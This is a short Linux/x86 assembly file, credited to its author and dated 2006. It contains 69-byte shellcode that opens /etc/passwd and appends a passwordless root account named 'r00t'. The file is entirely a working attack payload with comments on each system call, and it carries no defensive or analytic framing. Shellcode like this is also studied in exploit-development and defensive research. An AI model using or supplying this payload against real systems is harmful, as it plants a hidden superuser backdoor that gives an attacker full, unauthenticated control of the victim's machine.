;By Kris Katterjohn 11/14/2006
;69 byte shellcode to add root user 'r00t' with no password to /etc/passwd
;for Linux/x86


section .text

      global _start

 _start:

 ; open("/etc//passwd", O_WRONLY | O_APPEND)

      push byte 5
      pop eax
      xor ecx, ecx
      push ecx
      push 0x64777373
      push 0x61702f2f
      push 0x6374652f
      mov ebx, esp
      mov cx, 02001Q
      int 0x80

      mov ebx, eax

 ; write(ebx, "r00t::0:0:::", 12)

      push byte 4
      pop eax
      xor edx, edx
      push edx
      push 0x3a3a3a30 ; :::0
      push 0x3a303a3a ; :0::
      push 0x74303072 ; t00r
      mov ecx, esp
      push byte 12
      pop edx
      int 0x80

 ; close(ebx)

      push byte 6
      pop eax
      int 0x80

 ; exit()

      push byte 1
      pop eax
      int 0x80